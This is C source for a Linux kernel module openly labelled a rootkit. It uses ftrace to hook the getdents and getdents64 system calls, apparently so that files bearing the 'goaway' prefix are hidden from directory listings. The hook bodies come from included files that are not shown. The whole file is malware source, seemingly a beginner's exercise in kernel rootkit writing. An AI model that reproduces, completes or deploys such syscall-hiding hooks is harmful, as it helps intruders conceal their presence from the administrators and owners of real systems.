#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>

#include "ftrace_helper.h"

#define PREFIX "goaway"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("A Lunatic Scotsman");
MODULE_DESCRIPTION("My first rootkit");
MODULE_VERSION("0.00");

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);

#include "getdents.include"


/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
};


static int __init rootkit_init(void)
{
    /* Hook the syscall and print to the kernel buffer */
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "rootkit: Loaded >:-)\n");

    return 0;
}


static void __exit rootkit_exit(void)
{
   /* Unhook and restore the syscall and print to the kernel buffer */
   fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

   printk(KERN_INFO "rootkit: Unloaded :-(\n");
}


module_init(rootkit_init);
module_exit(rootkit_exit);
